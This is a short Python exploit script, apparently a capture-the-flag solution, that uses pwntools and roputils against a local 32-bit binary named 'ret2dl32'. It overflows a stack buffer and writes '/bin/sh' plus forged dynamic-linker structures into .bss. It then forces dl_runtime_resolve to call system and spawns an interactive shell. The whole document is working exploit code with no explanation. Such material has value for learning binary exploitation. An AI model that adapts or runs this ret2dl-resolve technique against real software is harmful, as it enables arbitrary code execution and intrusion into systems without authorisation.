#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import sys
sys.path.append("/home/tree/pwntools/roputils")
import roputils
import time
#coding:utf-8

elf = ELF('./ret2dl32')
offset = 0x2c
read_plt = elf.plt['read']
bss = elf.bss
vulFunc = 0x0804840b						#the vunlfunc address

p = process('./ret2dl32')
rop = roputils.ROP('./ret2dl32')
addr_bss = rop.section('.bss')

#step 1 write sh & resolve struct to addr_bss
payload = 'a'*0x2c
payload += p32(read_plt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(0x100)
p.send(payload)

sleep(1)
payload = rop.string("/bin/sh\x00")
payload += rop.fill(20, payload)
payload += rop.dl_resolve_data(addr_bss+20, 'system')			#func, name
payload += rop.fill(100, payload)
p.send(payload)

sleep(1)
#step 2 force to dl_runtime_resolve
payload = 'a'*0x2c
payload += rop.dl_resolve_call(addr_bss+20, addr_bss)
p.send(payload)


p.interactive()
p.close()